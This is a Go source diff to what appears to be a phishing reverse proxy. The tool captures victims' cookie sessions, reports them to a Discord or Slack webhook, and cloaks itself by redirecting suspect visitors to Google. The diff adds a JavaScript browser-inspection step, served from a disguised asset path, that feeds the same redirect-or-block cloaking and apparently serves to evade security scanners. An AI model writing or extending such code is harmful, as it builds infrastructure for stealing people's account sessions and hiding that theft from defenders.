@@ -18,6 +18,7 @@ import (
 	"github.com/s4l1hs/olta/pkg/proxy/database"
 	"github.com/s4l1hs/olta/pkg/proxy/log"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
+	"github.com/s4l1hs/olta/pkg/proxy/middleware/jsinspect"
 	"github.com/s4l1hs/olta/pkg/proxy/telemetry"
 	"github.com/s4l1hs/olta/pkg/proxy/validation"
 	"github.com/s4l1hs/olta/pkg/runtimepath"
@@ -43,6 +44,8 @@ var cloaker_redirect_url = flag.String("cloaker-redirect-url", "https://www.goog
 var cloaker_action = flag.String("cloaker-action", string(asncloak.ActionRedirect), "Cloaker enforcement action: redirect or block")
 var cloaker_block_status = flag.Int("cloaker-block-status", 404, "HTTP status for the cloaker block action: 403 or 404")
 var cloaker_trust_proxy_headers = flag.Bool("cloaker-trust-proxy-headers", false, "Inspect client IP headers supplied by a trusted reverse proxy")
+var enable_js_inspect = flag.Bool("enable-js-inspect", false, "Enable client-side browser environment verification")
+var js_inspect_endpoint = flag.String("js-inspect-endpoint", "/_assets/js/v.js", "Internal route used for client browser verification assertions")
 var enable_session_validator = flag.Bool("enable-session-validator", false, "Asynchronously validate captured cookie sessions")
 var webhook_url = flag.String("webhook-url", "", "Discord, Slack, or generic JSON webhook for session validation telemetry")
 
@@ -316,6 +319,19 @@ func main() {
 			return
 		}
 		log.Info("cloaker enabled with %s action", strings.ToLower(*cloaker_action))
+	}
+	if *enable_js_inspect {
+		err = hp.ConfigureJSInspect(jsinspect.Config{
+			Enabled:     true,
+			Endpoint:    *js_inspect_endpoint,
+			Action:      jsinspect.Action(strings.ToLower(*cloaker_action)),
+			RedirectURL: *cloaker_redirect_url,
+		})
+		if err != nil {
+			log.Fatal("js inspect: %v", err)
+			return
+		}
+		log.Info("client-side browser inspection enabled at %s with %s action", *js_inspect_endpoint, strings.ToLower(*cloaker_action))
 	}
 	if hs != nil {
 		hs.Start(hp)
